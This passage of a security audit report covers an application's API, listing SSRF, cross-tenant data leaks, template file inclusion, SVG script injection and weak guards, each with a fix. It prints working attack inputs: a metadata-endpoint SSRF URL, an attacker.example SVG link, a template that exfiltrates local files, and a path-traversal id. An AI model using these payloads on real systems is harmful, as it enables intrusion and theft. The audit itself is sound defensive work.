**File** `packages/egress/src/ssrf/url-validator.ts:250, 276, 311-317`;
`packages/egress/src/ssrf/fenced-fetch.ts:183, 190-193`.

Verified empirically on this repo's Node:

```
http://[::ffff:169.254.169.254]/  ->  hostname "[::ffff:a9fe:a9fe]"   isIP() = 0
http://[fd00:ec2::254]/           ->  hostname "[fd00:ec2::254]"      isIP() = 0
http://2130706433/ , http://0x7f000001/  ->  hostname "127.0.0.1"     isIP() = 4
```

The decimal and hex spellings are normalised by the WHATWG parser and caught. The bracketed forms are
not, and the brackets are never stripped:

1. `:137` — literal comparison against `BLOCKED_METADATA_HOSTS`: no match.
2. `:276` — `isIP(hostname)` is `0`, so `validateNotPrivateIpLiteral` is skipped entirely.
3. Falls through to `resolveHostname`, whose per-record `.catch(() => [])` (`:198-199`) swallows the
   failure, so `allAddresses.length === 0`; with `blockLocal: false` that returns `unresolved`
   (`:311-317`).
4. `fetchValidatedDestination` then builds `http://[::ffff:a9fe:a9fe]:80/…` (`fenced-fetch.ts:183`)
   and dispatches through a plain Agent with no pinning (`:190-193`) — undici resolves it to
   `169.254.169.254`.

The gap is **already asserted in the suite**:
`packages/egress/src/ssrf/__tests__/url-validator.unit.test.ts:108-127` documents the bypass and
reasons "A caller that relaxes the address policy AND skips the webhook layer is the only way through,
and nothing does that." Two callers do exactly that under the shipped default: the unauthenticated
image proxy and the model-provider probe. The webhook layer patched it locally
(`packages/egress/src/webhook/url-policy.ts:87-96` strips brackets) rather than at the classifier.

**Exploit.** No credential and no tenant required:

```
GET /api/image-proxy?url=http://[::ffff:169.254.169.254]/latest/meta-data/
```

`/api/image-proxy` is `publicEndpoint("SSRF-guarded image proxy, no credential")`
(`apps/api/src/features/image-proxy/image-proxy-rest.ts:51`). The plain spelling is refused by the
denylist; the bracketed IPv4-mapped spelling is not. The `image/*` content-type check at `:76` gates
the body, so this is an SSRF **status oracle** (`200` non-image → 400, `404` → 404) for internal host
and port discovery rather than a read primitive. It depends on `blockLocal: false`; with the flag on,
step 3 throws instead.

**Smallest correct fix.** Strip the brackets once, at `:250`:

```ts
const raw = parsedUrl.hostname.toLowerCase();
const hostname = raw.startsWith("[") && raw.endsWith("]") ? raw.slice(1, -1) : raw;
```

Every downstream check then sees the bare literal, and `webhook/url-policy.ts:87-96` becomes redundant.

---

## H9 — High: the organization audit log returns other organizations' project rows

**File** `packages/features/organization/server/src/repositories/prisma/prisma.organization-membership.repository.ts:1516-1523`
(read and confirmed):

```ts
orgIdConditions.push({
  organizationId: null,
  userId: { in: orgUserIdsList },
  projectId: { not: null }, // "any project, anywhere"
});
```

Project-level audit rows are written with `organizationId = NULL`: `packages/api/src/trpc/trpc-audit.ts:6-19`
(`auditScopeIds`) lifts `organizationId` and `projectId` straight off the tRPC input, so every
project-scoped mutation produces `{ organizationId: null, projectId, userId }`. `AuditLog` has no
`project` relation to re-anchor it and is one of the twelve guard-exempt project-scoped models, so the
multitenancy middleware does not object. The optional `projectId` filter at `:1541` is not validated
against the organization either — it is `OR: [{ projectId }, { projectId: null }]`.

**Exploit.** A user belonging to both organization A and organization B — routine here, since every
user has a personal organization. Any A-side caller who passes `assertAuditLogsAllowed` calls
`organization.getAuditLogs` with
`{ organizationId: "<orgA>", projectId: "<a project in Org B>", userId: "<that user>" }`; both
optionals are unconstrained (`organization.trpc-schemas.ts:166-180`). The response carries organization
B's project audit rows — action names, target ids, joined project names, and the full mutation
`args` / `before` / `after` payloads (`:1608-1636`).

_Fix:_ resolve the organization's own project ids (the repository already does this elsewhere) and use
`projectId: { in: orgProjectIds }` rather than `{ not: null }`; validate the `projectId` filter at
`:1541` against the same list.

---

## H10 — High: customer-authored Liquid templates can read files under the process working directory

Three engines are constructed with file inclusion left enabled:

- `packages/features/scenario/server/src/adapters/serialized-prompt-config.adapter.ts:24` (rendered at `:84, :89`)
- `packages/features/scenario/contract/src/http-template-engine.ts:44, 49, 55`
- `packages/features/automation/contract/src/templating/engine.ts:38` — hardened for denial of service
  and prototype reads, **not** for inclusion

liquidjs 10.27.1 defaults to `root: ['.']` with the node `fs`, so `{% render "…" %}` resolves relative
paths under the process cwd; escaping above the root is correctly refused.

**Exploit.** A customer sets a scenario HTTP agent's `bodyTemplate` to
`{"m":"{% render 'package.json' %}"}` and points its `url` at a host they control; the worker inlines
the file and POSTs it out. The same primitive works through a prompt config's `systemPrompt`, where the
content comes back in the transcript.

**Blast radius, stated honestly.** Confined to the cwd subtree. In the shipped image the worker's cwd
is `/app/apps/worker`, so the root `/app/.env` is **outside** it — production impact is source, bundle
and config disclosure rather than credentials. In local development, where cwd is the repository root,
`{% render '.env' %}` reads the workspace `.env`.

_Fix:_ pass an `fs` whose `exists` / `contains` always return false and whose `readFile` throws, plus
`relativeReference: false`, at all three sites — one shared `createSandboxedLiquid()`.

---

## H11 — High: the image proxy serves attacker-controlled SVG from the app origin with no `nosniff` and no CSP

**File** `apps/api/src/features/image-proxy/image-proxy-rest.ts:74-81`.

```ts
const contentType = response.headers.get("content-type");
if (!contentType?.startsWith("image/")) {
  return c.json({ error: "URL does not point to an image" }, 400);
}
return new Response(await response.arrayBuffer(), {
  headers: { "Content-Type": contentType, "Cache-Control": CACHE_CONTROL },
});
```

`image/svg+xml` satisfies `startsWith("image/")`, and an SVG is active content: a browser rendering one
at the top level executes its `<script>`. The response carries only `Content-Type` and `Cache-Control` —
no `X-Content-Type-Options: nosniff`, no `Content-Security-Policy`, no `Content-Disposition:
attachment`. The deployment's CSP would have stopped it, but it is emitted **only by the static
surface** (`apps/api/src/app-static/app-static.surface.ts:78-81`), which by construction handles only
paths the API did not claim — and `pathIsClaimedByTheApi` claims everything under `/api/`
(`:105-107`). So this response has no CSP at all. The sibling byte doors get it right: every
stored-object read carries `nosniff`, `default-src 'none'; sandbox` and `no-referrer` and coerces an
unsafe media type to `application/octet-stream`
(`packages/api/src/rest/media-response.ts:14-37`). The image proxy uses none of that machinery.

**Exploit.** The route is `publicEndpoint("SSRF-guarded image proxy, no credential")` (`:51`), so the
URL needs no credential to construct:

```
https://app.langwatch.ai/api/image-proxy?url=https://attacker.example/payload.svg
```

with the attacker's host answering `Content-Type: image/svg+xml`. A signed-in user who opens that link
runs the attacker's script **on the application's own origin**, with the session cookie's origin: it
can read `localStorage`, call the same-origin API as the victim, and — combined with C2 — reach every
mutation without needing a top-level navigation trick at all. The URL is on the product's own domain,
which is what makes it convincing to click.

**Smallest correct fix.** Reuse what the package already has: coerce through `safeMediaType` and attach
`STORED_OBJECT_RESPONSE_BASE_HEADERS` from `packages/api/src/rest/media-response.ts`, so an SVG comes
back as `application/octet-stream` under `default-src 'none'; sandbox` and `nosniff`.

---

## M1 — Medium: rate limiting runs after the body is read, parsed and validated

**Files** `packages/api/src/rest/pipeline.ts:90-127`; `packages/api/src/rest/capabilities.ts:23-26`.

The contract is stated in the limiter's own docblock — "Rate limiting runs after auth and before
validation: an over-limit caller costs a key lookup, not a parse." The pipeline does the opposite for
`public-rest`: auth (`:89`) → validation + full body read + zod (`:91-105`) → permission (`:107`) →
**then** the limiter (`:115-127`). So the limiter caps responses, not work: an over-limit caller still
pays a `text()`, a `JSON.parse` and a full zod pass on every request. Combined with finding 5 the
"just under the cap" constraint disappears.

**Smallest correct fix.** Move the `if (config.rateLimit)` block to immediately after
`appendAuthMiddleware` at `:89` — where the docblock already says it belongs. The limiter's key
(`capabilities.ts:38`) needs only the principal, which auth has set by then.

---

## M2 — Medium: `projectAuthorization` calls `next()` when nothing resolved

**File** `apps/api/src/api-rest.security.ts:349-354`.

```ts
const resolved = context.get("resolvedToken") as ResolvedApiKeyToken | undefined;
if (!resolved || resolved.type !== "apiKey") {
  return next(); // no credential => permission granted
}
```

`resolvedToken` is installed only by `projectAuthentication` (`:333`, via `installProjectVariables`
`:630-638`). Any chain that installs the permission middleware without the authentication middleware
ahead of it grants the permission unconditionally. The same body is exposed three ways —
`apiKeyCeiling` (`:386-388`), `ApiRestProjectPolicy.permissionMiddleware` (`:604-606`) and
`.authorize` (`:622-624`) — and `permissionMiddleware` is handed out bare as `requireApiKeyPermission`
at `apps/api/src/app/api-production.composition.ts:1886`.

**Reachability: not proven.** Every call site traced (`api-secret-rest.feature.ts:77-78`, the
framework's own `createProjectApp` chain) installs authentication first. This is reported as a
fail-open _shape_, not a demonstrated bypass.

**Smallest correct fix.**

```ts
if (!resolved) return this.refuse(context, new ApiRestMissingCredentialsError(), envelope);
if (resolved.type !== "apiKey") return next(); // legacy project key: full access, by design
```

---

## M3 — Medium: an empty `X-Project-Id` header is an unauthenticated 500

**Files** `apps/api/src/app/api-key-request-credentials.ts:25, 29` →
`apps/api/src/api-rest.security.ts:328` →
`packages/features/api-key/contract/src/api-key.tokens.ts:42`.

`extractApiKeyRequestCredentials` passes `xProjectId` straight through, so an
`X-Project-Id:` header with no value yields `projectId: ""`. `tryResolveToken` opens with
`apiKeyTokenResolutionInputSchema.parse(input)`
(`api-key-token-resolution.service.ts:64`), whose field is `z.string().min(1).nullable().optional()`.
`""` fails, the `ZodError` escapes `projectAuthentication` unwrapped, and the boundary renders a
generic 500. `api-dual-credential-auth.ts:124` guards this (`credentials.projectId ? … : {}`);
`api-rest.security.ts:328`, `api-handler-managed-credential.ts:88` and
`packages/features/langy/server/src/transport/api-rest/langy-rest.credentials.ts:104-107` do not.

**Exploit.** `curl -H 'Authorization: Bearer sk-lw-x' -H 'X-Project-Id;' https://…/api/<project route>`
returns 500 for an unauthenticated caller. Cheap error-budget and log-flood amplification, and it
books a customer-caused refusal as a platform fault.

**Smallest correct fix.** Normalise once, in `api-key-request-credentials.ts`: return
`projectId: xProjectId || null` from both the Bearer and the `X-Auth-Token` branch.

---

## M4 — Medium: framework guards that are declared but inert

Three separate shapes, same class: something is recorded that nothing enforces.

**`permissionScope` is never compared for `rest` and `sse` endpoints.**
`packages/api/src/rest/pipeline.ts:704-723` reads `config.permissionScope` inside
`projectInputMiddleware`, which is pushed **only** in the `public-rest` branch (`:105`). For the other
two kinds the handler middleware calls `assertAuthorizedProjectInput` and never looks at
`permissionScope` (`:681-689`). `ChainBuilder.withPermissionScope`
(`packages/api/src/rest/definition.ts:368-371`) sets it unconditionally on the shared implementation
class. Its only call site outside the framework is a test
(`packages/api/src/rest/__tests__/public-rest.unit.test.ts:425`), so **no reachable exploit** — the
defect is that the first `registerRoute` author to reach for it gets a check that compiles, records,
and does nothing. _Fix:_ consult `config.permissionScope` in the `:681-689` branch too.

**The cross-tenant input check is off by default.** `assertAuthorizedProjectInput`
(`pipeline.ts:728-747`) opens `if (!required) return;`, where `required` is
`serviceConfig.projectIdInput === true` — declared optional and `@deprecated` at
`packages/api/src/rest/types.ts:377`. `createVersionedApp`
(`packages/api/src/rest/security/rest-api-service.ts:722-730`) never sets it, and across the repo
`projectIdInput: true` appears in exactly one non-test file
(`apps/api/src/api-secret-rest.feature.ts:79`). So for every versioned family the framework performs
no comparison between a tenant id named in the request and the tenant the credential resolved to;
the comment at `pipeline.ts:710-714` acknowledges this. Sampling the four live versioned families
(`organization`, `role`, `role-binding`, `scim`), each derives the tenant from the credential —
`role-binding.api.ts:219, 239, 245, 258, 286, 294, 315` all read `organizationOf(c).id` — so **no
currently-exploitable endpoint was found**. Correctness rests entirely on each handler author
remembering. _Fix:_ make the check unconditional when validated input carries any `ScopeIdKey` (the
list is already at `definition.ts:184`) and keep `projectIdInput` as an explicit opt-_out_ with a
reason.

**`createServiceApp` installs an empty chain when `verifySecret` is omitted.**
`rest-api-service.ts:686-701` returns `args.verifySecret ? [args.verifySecret] : []` for an `internal`
or `anyAuthenticated` policy, while `route-registry.ts:33` still records
`credentialClass: "internal"`. Two live routes declare `internalSecret` with no `verifySecret` —
`packages/enterprise/features/scim/server/src/transport/api-rest/scim-webhook-intake.api.ts:37-44` and
`packages/enterprise/features/billing/server/src/transport/api-rest/stripe-webhook.api.ts:53-56`. Both
verify in-handler today, so this is not a live bypass; it is a bug the type system cannot catch —
delete the in-handler `if` and the route becomes fully public while still registering as protected.
_Fix:_ require `verifySecret` when any route declares `internalSecret`, or add a distinct
`handlerVerifiedSecret(reason)` policy so "empty on purpose" reads differently from "a secret is
enforced here".

---

## M5 — Medium: timing-unsafe comparison of the SCIM webhook shared secret

**File** `packages/enterprise/features/scim/server/src/transport/api-rest/scim-webhook-intake.api.ts:47-50`.

```ts
const secret = ports.webhookSecret();
if (!secret) return c.json({ error: "Webhook not configured" }, { status: 404 });
if (c.req.header("authorization") !== secret)
  return c.json({ error: "Unauthorized" }, { status: 401 });
```

`!==` on strings short-circuits at the first differing byte and leaks length. This is the only
non-constant-time secret comparison reachable from the REST surface — nothing inside `packages/api`
compares a secret at all, and the neighbouring features get it right (`langy-internal.api.ts:68-90`
and `organization-provisioning.api.ts:99` both use a length-guarded `timingSafeEqual`). Exploiting a
network-side JS timing oracle is hard, which is why this is medium; it is a deviation from the
pattern the rest of the codebase already follows. Note the unconfigured case fails **closed** (404),
which is correct. There is also no timestamp or replay window on this receiver.

_Fix:_ route it through the same length-guarded `timingSafeEqual` helper, or move it to
`createServiceApp({ verifySecret })`.

---

## M6 — Medium: legacy project keys are plaintext, permanent, unrevocable and ceiling-exempt

**File** `packages/features/api-key/server/src/repositories/prisma/prisma.api-key.repository.ts:133-146`.

```ts
const row = await this.database.project.findUnique({
  where: { apiKey: input.token, archivedAt: null },
});
```

The raw token **is** the `Project.apiKey` column. No hash, no `expiresAt`, no `revokedAt`; the only
lifecycle operation is `rotateLegacyProjectKey` (`:140`). The scoped-key path by contrast checks
`revokedAt` and `expiresAt` and compares an HMAC with `timingSafeEqual`
(`api-key-token-resolution.service.ts:43-61`). This class is also exempt from every ceiling by
design: `api-rest.security.ts:351-354` and `api-handler-managed-credential.ts:76-78, 143` all return
early for `resolved.type !== "apiKey"`. A leaked legacy key is therefore unrestricted full project
access, valid forever, invisible to the revoke path.

_Timing:_ **not a timing finding.** The comparison is a Postgres unique-index lookup, not a byte loop
in Node; I do not believe a practical oracle exists there.

_Fix (bounded):_ give the fallback at `api-key-token-resolution.service.ts:76-78, 114` a kill switch
so a deployment can refuse the class outright. Migrating to hashed storage is a larger change than
this audit should propose.

---

## M7 — Medium: share links default to permanent, public and unlimited, and minting is uncapped

**Files** `packages/features/share/server/src/transport/api-trpc/share.api.ts:62-113`;
`packages/features/share/server/src/services/share.service.ts:183-240`.

```ts
visibility: shareVisibilitySchema.default("PUBLIC"),   // :66
expiresAt: z.date().nullish(),                         // :67  null = never expires
maxViews: z.number().int().positive().nullish(),       // :68  null = unlimited
```

`createShare` does no counting and no throttling; there is no per-project or per-actor cap on live
links, and the default mint is a permanent anonymous bearer token. `isExpired` / `isViewExhausted`
(`share.service.ts:370-376`) are correct but only fire on links that opted in.

**Exploit.** A member holding `traces:share` scripts `share.createShare` over every trace id and
produces an unbounded set of permanent public URLs for the project's whole trace corpus. Revocation
is per-link or per-project; nothing bounds creation. This matches the previously recorded production
figure of roughly 428k permanent share tokens.

_Fix:_ a per-project live-link ceiling plus a per-actor mint rate limit in `ShareService.createShare`,
using the same `rateLimit` port the anonymous read already takes
(`packages/features/trace/server/src/transport/api-trpc/shared-trace.api.ts:110-114`).

---

## M8 — Medium: `POST /api/auth/validate` is an unauthenticated, unthrottled key oracle

**File** `packages/features/auth/server/src/transport/api-rest/auth.api.ts:114-132`.

Declared `publicEndpoint(...)`, so no chain. It takes `x-auth-token` and answers `{ projectSlug }` for
a valid key or 401 for an invalid one, with no rate limit in the handler and none in the chain. It
confirms a leaked or guessed key's validity and discloses the project behind it without touching any
data path that would be logged as access. Key entropy (≈286 bits of secret) makes blind guessing
impractical, so this is confirmation-of-a-held-token rather than brute force.

_Fix:_ a per-token and per-address fixed-window limit, matching `shared-trace.api.ts:147-177`.

---

## M9 — Medium: the origin gate exists but is mounted only on `/api/auth/*`

**File** `packages/features/auth/server/src/transport/api-rest/auth.api.ts:218-241`.

`isAllowedAuthOrigin` (`packages/features/auth/server/src/transport/better-auth/origin-gate.ts`) is
correct in itself — read-only methods pass, state-changing methods require an exact `Origin` **or**
`Referer` origin match, and a malformed `baseUrl` rejects everything. It is wired into the better-auth
catch-all only. The following are `handlerManagedAuth(credential: "session")` with no origin or CSRF
check: `POST|DELETE /api/admin/impersonate` and `POST /api/admin/:resource`
(`packages/features/ops/server/src/transport/api-rest/admin.api.ts:171-174`), `POST /approve` and
`POST /deny` on the CLI device flow
(`packages/features/auth/server/src/transport/api-rest/auth-cli-device-flow.api.ts:801, 1019`), and
`GET /api/auth/logout` (`auth.api.ts:212`). `SameSite=Lax` blocks a cross-site subresource **POST**,
so the POST routes are **not proven exploitable**. `GET /api/auth/logout` is reachable by top-level
navigation and does revoke the session (`:172-184`) — forced-logout CSRF, low impact.

Two secondary notes on the gate itself: it checks only `ports.baseUrl` (`:223`) while `trustedOrigins`
accepts both `baseUrl` and `publicBaseUrl`
(`packages/features/auth/server/src/transport/better-auth/better-auth.api.ts:220-229`), so behind a
proxy where the two differ every state-changing auth request is rejected — it fails **closed**, an
availability bug rather than a security one.

_Fix:_ apply the gate as shared middleware over every cookie-authenticated state-changing route, not
just the auth catch-all. The same middleware closes finding 1's defence-in-depth gap.

---

## M10 — Medium: two more declared-but-unenforced claims

**`/approve` declares a permission its `device_session` branch never checks.**
`packages/features/auth/server/src/transport/api-rest/auth-cli-device-flow.api.ts:254-258` declares
`handlerManagedAuth({ permissions: ["project:update"] })`. The project-key branch enforces it via
`refuseProjectKeyHandout` → `canWriteProject` (`:858-925`); the device-session branch (`:927-1016`)
does not. That branch does check active organization membership (`:824-836`) and bounds the minted key
against the approver's own ceiling through `validateCliSelection` (`:964-974`), so the key cannot
exceed what the approver holds — but a route audit reading the registry is told a permission is
enforced that this branch never asks for. _Fix:_ enforce on both branches, or split the declaration so
the device-session route declares `[]`.

**The version-namespace guard registers as `public` but dispatches the family's full stack.**
`packages/api/src/rest/route-mounting.ts:91-107` mounts `app.all(guardPath, fallback, notFound)` where
`fallback` is `buildDateFallback(...)`, which for any real date runs the effective version's whole
endpoint stack (`:245-254`). It is then classified as
`publicEndpoint("version-namespace guard: … reads no data and takes no credential")`
(`packages/api/src/rest/security/rest-api-service.ts:469-484`). Enforcement itself is intact — the
dispatched stack contains auth and the permission check — so this is a registry entry that lies to
every downstream audit, not a bypass. _Fix:_ register as public only when `buildDateFallback` returned
`null`.

**The route-policy registry overwrites on collision.**
`packages/api/src/rest/security/route-registry.ts:26-38` keys on `METHOD path` and `set`s over a
duplicate; Hono dispatches to the **first** matching registration. Twenty-one families share the
`/api` base path (`rest-api-service.ts:293-297`), so a collision would have the registry describing a
policy belonging to a route that never answers. No live collision was found in the current
composition, so this is audit-integrity rather than a demonstrated hole. _Fix:_ throw on a duplicate
key whose recorded policy differs.

---

## M11 — Medium: two egress hardening gaps beside the fence

**The image proxy has no response size cap and no request timeout.**
`apps/api/src/features/image-proxy/image-proxy-rest.ts:62-80` calls `fetchValidatedDestination` with
no `signal`, no `headersTimeoutMs` and no `bodyTimeoutMs`, then reads the body with
`await response.arrayBuffer()` — unbounded. Undici's 300-second default is the only bound. On an
**unauthenticated** endpoint that is a memory-exhaustion and slowloris primitive:
`GET /api/image-proxy?url=<attacker host streaming an endless image/png>`, repeated. The webhook sender
gets all three right — `packages/egress/src/webhook/http-destination.ts:29, 34, 165-169` plus the
capped reader at `:102-135` — so the image proxy is the one fenced caller that takes none of them.
_Fix:_ pass `signal: AbortSignal.timeout(…)`, `headersTimeoutMs` and `bodyTimeoutMs`, and read through
a capped reader rather than `arrayBuffer()`.

**Outbound webhook TLS verification is off on self-hosted.**
`apps/worker/src/app/worker-webhook-egress.composition.ts:76` —
`tls: { rejectUnauthorized: options.config.deployment.saas }`. With `IS_SAAS` unset, certificates go
unverified for **every** outbound webhook, public `https://` destinations included, so an attacker in
a network position can intercept payloads carrying customer trace data along with the signing header.
The rationale — on-prem receivers with self-signed certificates — is documented and reasonable, but
the switch is all-or-nothing and derived from an unrelated flag. _Fix:_ make it its own opt-in leaf
(`WEBHOOK_ALLOW_INSECURE_TLS`) so an operator relaxes it deliberately rather than by default.

**Allowlisted non-IP hosts are not pinned.** `packages/egress/src/ssrf/url-validator.ts:264-273`
returns `allowlisted` with `resolvedIp` set only when the hostname is itself an IP literal; otherwise
`fenced-fetch.ts:190-193` falls back to a plain Agent that re-resolves at connect time. Bounded — the
name is operator-allowlisted and already exempt from the address block — so the exposure is DNS-level
redirection of a host the operator already trusts. _Fix:_ resolve and pin allowlisted hostnames too,
exempting them from the address _policy_ but not from the _pinning_.

---

## M12 — Medium: an unencoded path segment in a server-side fetch that carries the project API key

**File** `apps/api/src/app/api-trpc-collaborators.execution.composition.ts:571-580`:

```ts
`${options.publicBaseUrl.replace(/\/$/, "")}/api/workflows/${input.workflowId}/run`
… headers: { ...(project?.apiKey ? { "x-auth-token": project.apiKey } : {}) }
```

`workflowId` is a bare `z.string()`
(`packages/features/workflow/server/src/transport/api-trpc/workflow-optimization.api.ts:126`) and the
procedure is gated only `policy("workflows:view")` (`:149`).

**Exploit.** A `workflows:view`-only member calls `optimization.chat` with
`workflowId: "../../../api/<some endpoint>"`. WHATWG URL normalisation collapses the segments, so the
server POSTs the caller's `inputMessages[0]` to an arbitrary path on its own public API **with the
project API key attached** — a credential their permission does not entitle them to. `?` and `#`
inject a query and fragment the same way.

_Fix:_ `encodeURIComponent(input.workflowId)`. A format constraint on `workflowScopeSchema` is a
reasonable second step, not a substitute.

---

## M13 — Medium: the ops EXPLAIN `system.*` guard is bypassable with quoted identifiers

**File** `packages/features/ops/server/src/services/ops-clickhouse-explain.core.ts:30` —
`SYSTEM_SCHEMA_RE = /\bsystem\s*\./i` runs on the output of `stripCommentsAndStrings`, which rewrites
`"…"` to `""` (`:124-143`) and never lexes backticks. Running the shipped lexer and regexes directly:

| input                                   | verdict                                 |
| --------------------------------------- | --------------------------------------- |
| `SELECT * FROM system.users`            | blocked                                 |
| `SELECT * FROM "system"."users"`        | **allowed**                             |
| `SELECT * FROM "system".query_log`      | **allowed**                             |
| ``SELECT * FROM `system`.`users` ``     | blocked (by the `SYSTEM` keyword rule)  |
| `SELECT * FROM gcs('http://evil/x')`    | **allowed** — absent from the deny-list |
| `SELECT * FROM mergeTreeIndex(db, tbl)` | **allowed**                             |

Only the unquoted form is tested
(`packages/features/ops/server/src/services/__tests__/ops-clickhouse-explain.core.unit.test.ts:116-119`).
Severity is capped at medium because the route sits behind a constant-time operator bearer compare,
the SQL is always `EXPLAIN`-wrapped with `ANALYZE` blocked, and the dedicated `langwatch_ops` account
is `readonly=1` with no SOURCES grant. Data extraction was **not** demonstrated — the finding is that a
stated defence layer does not hold, and that `gcs` / `dictGet` / `mergeTreeIndex` are missing from the
table-function deny-list.

_Fix:_ lex backticks alongside quotes and emit the _unquoted inner text_ rather than `""`, so quoted
names stay visible to the regex pass; add the missing table functions.

---

## M14 — Medium: two Prisma tenancy defects, one broken feature and one hardening gap

**`GatewayGuardrail` update and archive omit `projectId`.**
`packages/features/gateway/server/src/repositories/prisma/prisma.gateway-guardrail.repository.ts:89-90`
and `:104-105` use `where: { id: input.id }`. `GatewayGuardrail` carries `projectId` and is in none of
the exempt buckets, so `guardProjectId` throws a plain `Error` — a generic "unknown error" plus a trace
id for the customer — on every guardrail edit and delete. Not a leak; a broken feature that ships green
because the tests substitute a permissive guard (`prompt-service.test-fixture.ts:19`,
`gateway-platform-rest.harness.ts:40`). Both inputs already carry `projectId`. _Fix:_
`where: { id: input.id, projectId: input.projectId }`.

**The guard's `projectId` check is a truthiness test.**
`packages/prisma-client/src/multi-tenancy-guard.ts:928-940` tests `!params.args?.where?.projectId`.
`{ projectId: { not: null } }`, `{ not: "x" }` and `{}` are truthy objects that match **every tenant**
while satisfying the guard; `projectId: ""` is falsy and correctly throws, which is why the roughly 60
`z.string()`-without-`.min(1)` id fields in the tRPC contracts are not currently exploitable. The only
live `{ not: … }` today is H9's already-exempt `AuditLog`, so this is **unproven as a live leak on a
guarded model** — it is one edit from becoming one. _Fix:_ require
`typeof where.projectId === "string" && where.projectId.length > 0`, mirroring the existing
`isScopeIdValue`. Related limits in the same file, deliberate per its own comments and worth knowing:
`extractRawSql` returns `null` for an unrecognised argument shape and the guard then **fail-opens**
(`:841`), and `RAW_TENANCY_PREDICATE_RE` only requires the substring `projectId` to appear anywhere in
the statement, a comment included.

---

## M15 — Medium: five genuinely project-scoped models are exempt from the Prisma tenancy guard

**File** `packages/prisma-client/src/multi-tenancy-guard.ts:111-123`.

```ts
const LICENSE_COUNTED_PROJECT_MODELS = [
  "Workflow",
  "Evaluator",
  "Scenario",
  "BatchEvaluation",
  "Agent",
] as const;
```

They are exempted so organization-level license-count rollups — which walk
`project.team.organizationId` with no `projectId` in the WHERE — do not throw. The effect is that
`prisma.agent.findMany({})` and `prisma.scenario.findFirst({ where: { id } })` pass the guard entirely,
on five of the highest-value project-scoped tables. A live instance:
`AgentRepository.tryFindByIdOnly`
(`packages/features/agent/server/src/repositories/prisma/prisma.agent.repository.ts:67-71`,
`where: { id, archivedAt: null }`) reached from `AgentService.getSourceOfCopy`
(`agent.service.ts:477-481`) — tRPC-only, and the copy flow re-probes `ctx.can` per copy's own
`projectId`, so **no cross-tenant read is asserted here**. The finding is that the exemption is far
broader than its reason: the rollups are a handful of known queries, not a class of model.

_Fix:_ move the five into `SCOPED_MODELS` with a `validateWhere` accepting a row id, `projectId`,
`projectId.in`, or the organization anchor the count uses — the shape `CustomLLMModelCost` already has
at `:578-611`.

---

## M16 — Medium: eleven project list endpoints have no page size at all

Three have no pagination parameters whatsoever and read tables that grow with usage:

- `GET /api/prompts` — `packages/features/prompt/server/src/transport/api-rest/prompt.api.ts:335-337`,
  no query schema; `prisma.prompt.repository.ts:195-215` calls `findMany` with **no `take`**, plus a
  correlated `versions` sub-select and an author join per row, then a `groupBy` over every id, then a
  full Zod parse of every prompt's `configData`. It returns the project's whole prompt table plus every
  `ORGANIZATION`-scoped prompt in the organization.
- `GET /api/prompts/:id/versions` — `prompt.api.ts:678-680`;
  `prisma.prompt-version.repository.ts:78-84`, no `take`. The worst of the three: version rows
  accumulate monotonically, one per save, each carrying the whole `configData`, and
  `include: { author: true }` returns the entire `User` row per version rather than the `{ id, name }`
  select its sibling repository uses.
- `GET /api/annotations` —
  `packages/features/annotation/server/src/transport/api-rest/annotation.api.ts:141, 150-153`;
  `prisma.annotation.repository.ts:206-220`, no `take`. The repository input schema _supports_
  `startDate` / `endDate` / `traceIds` and the route passes none of them, so it is the widest possible
  call into a method built to be narrowed.

Eight more call a service `list`/`getAll` with `{ projectId }` and nothing else, bounded by object
counts rather than event counts: `dashboard.api.ts:102`, `automation.api.ts:127`,
`evaluator.api.ts:97`, `monitor.api.ts:165`, `scenario-v1.api.ts:280`, `suite.api.ts:326`,
`run-plans-v1.api.ts:138`, `workflow.api.ts:175`. Separately,
`experiment-v3.api.ts:910-921` caps `pageSize` at 200 twice over but puts no ceiling on `page`, which
becomes `OFFSET {offset:UInt32}` (`clickhouse.experiment-run.repository.ts:254, 285`) — **not proven
expensive**, since the query is already narrowed by `TenantId` + `ExperimentId` with an IN-tuple dedup
and a `page` above ~21.5 million overflows the `UInt32` into a parse error rather than a scan.

All of these read the caller's own project — `project` comes from the credential — so this is
noisy-neighbour and self-inflicted denial of service, not a tenancy break. One
`curl -H "X-Auth-Token: $KEY" https://…/api/prompts` each. _Fix:_ the `paginationQuerySchema` this
repository already repeats verbatim four times (`dataset.api.ts:99-102`, `team.api.ts:21-24`,
`group.api.ts:33-36`, `project.api.ts:50-53` — `limit: z.coerce.number().int().positive().max(1000)
.default(50)`).

---

## Low — the remaining smaller defects

**`/metrics` is open whenever `NODE_ENV` is not exactly `production`.**
`apps/api/src/platform/infrastructure/api-metrics.infrastructure.ts:57-69`: a configured key gates it;
no key in `production` means the route is not mounted at all; **no key anywhere else means
`{ gate: "open" }`**. The comparison is `options.nodeEnvironment === "production"`, so a deployment
running `NODE_ENV=prod` or `staging` without `METRICS_API_KEY` serves the full Prometheus registry —
queue depths, per-tenant counters, process internals — to anyone who asks for `GET /metrics`. _Fix:_
invert the default so `open` requires an explicit opt-in rather than the absence of a key.

**The metrics bearer key is compared with `===`.**
`apps/api/src/platform/infrastructure/prometheus.api-metrics.adapter.ts:69`:
`request.headers.get("authorization") === \`Bearer ${this.access.key}\``. Same class as finding 13,
lower stakes. *Fix:* length-guarded `timingSafeEqual`.

**Two `canonicalErrorFor` implementations disagree at 5xx.**
`apps/api/src/app/api-canonical-error.ts:169-180` collapses a handled 5xx to
`internal_error` + "An unknown error occurred" + trace ids, with a written rationale.
`apps/api/src/app/api-rest-observability.composition.ts:119-140` — the one `renderCanonical` actually
calls — publishes the handled error's own `code`, `message` and `meta` at every status including 5xx.
Handled messages are customer-safe by rule (ADR-045), so this is a defence-in-depth divergence rather
than a proven leak, but two mappings for one boundary is exactly the drift the second file's docblock
says it exists to prevent. _Fix:_ have `renderCanonical` call the collapsing mapping.

**Unauthenticated callers share one rate-limit bucket.**
`packages/api/src/rest/capabilities.ts:64-77` resolves a principal from five context keys and
otherwise returns the literal `"anonymous"` — there is no per-address fallback. One client can spend
the whole budget for every anonymous caller on that route. _Fix:_ fall back to the resolved client
address before `"anonymous"`.

**Impersonation survives the impersonator losing staff status.**
`packages/features/auth/server/src/services/auth.service.ts:73-105` re-reads `Session.impersonating`,
checks the window's `expires` and that the **target** is still active (`:78-81`), but never re-checks
that the impersonator is still on the allow-list. Removing an operator from `ADMIN_EMAILS` leaves
their in-flight impersonation valid for up to the full 1 h TTL
(`packages/features/ops/server/src/services/impersonation.service.ts:11`). _Fix:_ re-assert
`access.isAdmin` on the impersonator inside `tryResolveBrowserSession`.

